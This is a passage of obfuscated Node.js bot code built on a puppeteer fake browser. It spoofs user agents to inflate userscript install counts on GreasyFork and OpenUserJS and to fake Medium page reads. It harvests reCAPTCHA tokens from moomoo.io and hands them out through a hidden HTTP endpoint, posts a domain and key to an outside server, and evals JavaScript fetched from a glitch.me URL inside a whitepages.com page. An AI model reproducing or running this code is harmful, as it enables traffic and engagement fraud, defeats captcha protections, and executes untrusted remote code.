      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + W(0x1c) + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + X(0x0, '49dd') + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + W(0x16) + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + V(0xc) + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + X(0xf, '$Kj*') + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x1953 + -0xf38 + 0x1 * 0x288b
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const Y = c;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f[(Y(0x19))]()['displayUse' + 'rActionLay' + 'er'](0x797 + 0x1381 * 0x1 + -0x363 * 0x8)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + Y(0x8) + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x14f0 + 0x1c77 + -0x723), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x1013 * 0x1 + -0x1 * 0x20fd + 0x3174), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0xe * 0x15d + 0x219 + 0x10fd;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x298 * 0x5 + 0x1007 * -0x1 + 0x1 * 0x30f; w < getRandomInt(0x2 * -0x27f + 0x1dc2 + 0x3 * -0x841, 0x2528 + 0x1 * -0x267d + 0x2 * 0xad); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x971 * -0xd + -0xa0 * 0xe6 + 0x1 * 0x1f4dd);
        }
      }();
    }, 0x1c5 * 0x15 + 0x1de9 + -0x42ae), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x1108 + 0x1 * 0x2531 + 0xd * -0x18d;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x1953 + 0xffd * -0x2 + -0x1 * -0x394d, 0x224c + -0x382 * 0x8 + -0x60a)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x8d47 + 0x5888 + -0x709f);
    }, 0xb1d + 0x95c + 0x1 * -0x1415), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0xdf9 + 0x2192 + 0x2f8b * -0x1;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0xaa4 + -0xe04 + 0x1 * 0xf18), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0xde4 + -0x1 * 0x20fb + 0x2edf), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0xcc6f4 * -0x1 + 0x4ce95 + 0x15b3ff);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x24d5 + -0x5 * -0x2be + -0x3227 * 0x1);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x1627 + -0xcb * -0x3 + 0x1 * 0x148e);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x5e * -0xa + -0x2dc5 + 0x49a9);
}
doFlags['doOUJS'] && ((async () => {
  const a1 = c,
    a0 = b;
  async function f() {
    const Z = b,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x1a65 * 0x1 + 0x9ec + -0x2450) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x1 * -0x1e85 + -0x222c + 0x3a8));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x13d * -0x5 + 0x25be + -0x1e9 * 0x17, D['indexOf']('\x20'));
        return B ? E['slice'](-0x1e0 + 0x12ac + -0x10cc, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x36f * -0x7 + -0x139e + 0x22a5),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x4620 + 0x32a8 + -0x5 * 0x1058),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + Z(0x11, 'PzWg') + 'q=0.9',
        'accept-encoding': Z(0x1d, 'LMbi') + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + a0(0x1e, '^z$t') + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + a0(0x1a, 'jLSs') + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + a1(0x6) + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
